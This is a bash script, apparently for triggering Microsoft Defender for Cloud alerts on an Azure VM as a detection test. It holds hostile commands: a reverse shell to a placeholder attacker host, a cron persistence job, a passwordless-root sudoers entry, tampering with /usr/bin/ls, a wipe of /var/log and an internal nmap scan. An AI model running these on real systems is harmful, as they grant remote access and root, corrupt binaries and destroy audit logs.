#!/bin/bash

# These commands could be run from a shell to the VM
# Or from the "az vm run-command" command, as shown below

# These commands are benign but mimic behaviors flagged by Defender for Cloud. Running in production may trigger alerts and remediation workflows.

# get resource group
export RESOURCE_GROUP_NAME=secure-rg

# get VM name
VM_NAME=$(az vm list \
  --resource-group $RESOURCE_GROUP_NAME \
  --query "[0].name" \
  --output tsv)
 
# access the VM and generate some inbound/outbound traffic
az vm run-command invoke \
  --command-id RunShellScript \
  --name $VM_NAME \
  --resource-group $RESOURCE_GROUP_NAME \
  --scripts "ping -c 4 8.8.8.8"

# manually create the EICAR test file
az vm run-command invoke \
  --command-id RunShellScript \
  --name $VM_NAME \
  --resource-group $RESOURCE_GROUP_NAME \
  --scripts "echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar.txt"

# simulate SQL injection tool usage
curl -A "sqlmap/1.0" http://example.com

# simulate execution of an unexpected script
echo "echo malicious command" > /tmp/bad.sh && chmod +x /tmp/bad.sh && /tmp/bad.sh

# persistence technique
sudo bash -c 'echo "*/5 * * * * root /tmp/malicious.sh" > /etc/cron.d/testjob'

# open reverse shell
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# scan internal subnet
nmap -sS 10.0.0.0/24

# download a suspiciuous file
wget http://testmyids.com -O /tmp/testfile

# modify critical files
sudo echo "root ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# tamper with binaries
echo "echo hacked" >> /usr/bin/ls

# clear logs
sudo rm -rf /var/log/*

# write to sensitive system path
sudo echo "test" > /etc/cron.d/testjob

# trigger many repeated outbound connections
for i in {1..50}; do curl http://example.com; done

az vm run-command invoke \
  --command-id RunShellScript \
  --name $VM_NAME \
  --resource-group $RESOURCE_GROUP_NAME \
  --scripts "mdatp health"
  
az vm run-command invoke \
  --command-id RunShellScript \
  --name $VM_NAME \
  --resource-group $RESOURCE_GROUP_NAME \
  --scripts "sudo cat /etc/opt/microsoft/mdatp/managed/mdatp_managed.json"